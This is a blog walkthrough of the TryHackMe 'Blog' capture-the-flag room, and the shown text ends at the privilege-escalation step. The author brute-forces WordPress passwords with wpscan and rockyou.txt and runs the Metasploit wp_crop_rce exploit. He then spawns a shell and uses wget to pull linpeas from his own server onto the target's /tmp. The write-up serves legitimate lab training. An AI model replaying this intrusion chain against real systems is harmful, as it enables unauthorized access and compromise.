<p>Hello Guys!</p>

<p>In this Post we will discuss the Blog CTF on TryHackMe.
At this point its a new Room (5 Days old).
In order to get the blog to work with AWS, youâ€™ll need to add blog.thm 
to your /etc/hosts file.</p>

<p>URL: <a href="https://tryhackme.com/room/blog">Blog</a></p>

<p>Difficulty: Medium</p>

<p>Author: <a href="https://tryhackme.com/p/Nameless0ne">Nameless0ne</a></p>

<p>As always, I started by Enumerating the System.</p>

<p>Nmap gor me the following Results:</p>

<p>Afterwards I ran enum4linux and Gobuster with the popular common.txt Wordlist.</p>

<p>In the Actual Site, we can also see two Names which we could use to Bruteforce a Password:</p>

<p><img src="https://cdn.discordapp.com/attachments/723180241140318278/733289155953688636/unknown.png" alt="names" /></p>

<p>I used all Usernames I got up until that point, and made a custom Username-List. I simply changed the formats
from Names to usernames, for example:</p>

<p><code class="language-plaintext highlighter-rouge">bob johnson -&gt; bob.johnson -&gt; johnson.bob -&gt; bob-johnson -&gt; bob-johnson123 ...</code></p>

<p>Thats what you could do on another Site. Since we got a Wordpress Site, we can use a Tool called <strong>wpsscan</strong> to 
Enumerate Users and Dictionary Attack their Password with rockyou.txt.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[i] User(s) Identified:

</code></pre></div></div>

<p>As I said before, from here you can use the Tool with the two found Usernames to Dicitonary attack the</p>

<p>two Users.</p>

<p>After getting the Password for one of the Users, you will get Access to the Panel. You have no rights</p>

<p>to actually Post anything. We need to PrivEsc.</p>

<p><img src="https://cdn.discordapp.com/attachments/723180241140318278/733317602692300830/unknown.png" alt="panel" /></p>

<p>Since this is a outdated WordPress Version, I found a <a href="https://www.exploit-db.com/exploits/46662">Exploit</a> for it.</p>

<p>It has its own Metasploit Module in <strong>exploit/multi/http/wp_crop_rce</strong>. As the Name says, its a RCE Exploit.</p>

<p><img src="https://cdn.discordapp.com/attachments/723180241140318278/733319786632708184/unknown.png" alt="msfmodul" />

<p>As we can see, we gained a Meterpreter Session. We are currently <strong>www-data</strong>. We have to PrivEsc again.</p>

<p><img src="https://cdn.discordapp.com/attachments/723180241140318278/733322172495298590/unknown.png" alt="www-data" /></p>

<p>I opened a Shell to navigate faster. I had to spawn the Bash Shell with the following Command:</p>

<p><code class="language-plaintext highlighter-rouge">python -c 'import pty; pty.spawn("/bin/bash")'</code></p>

<p><img src="https://cdn.discordapp.com/attachments/723180241140318278/733323150846066768/unknown.png" alt="shelldrop" /></p>

<p>The actual User Flag in /home/bjoe1 turns out to be a Fake User Flag.</p>

<p>In order to PrivEsc the right way, I uploaded linpeas onto the System. I created a Python Web Server</p>

<p>on my local Machine with the Command <code class="language-plaintext highlighter-rouge">python3 -m http.server [PORT]</code>. The Webserver needs to be initialized
in the Folder, the File(s) you want to Download are stored. Afterwards I ran the Command
<code class="language-plaintext highlighter-rouge">wget http://{IP}:{PORT}/linpeas.sh</code> to Download the File. Make sure to be in a Direvtory where you are
able to Execute, /tmp is always a good one.</p>
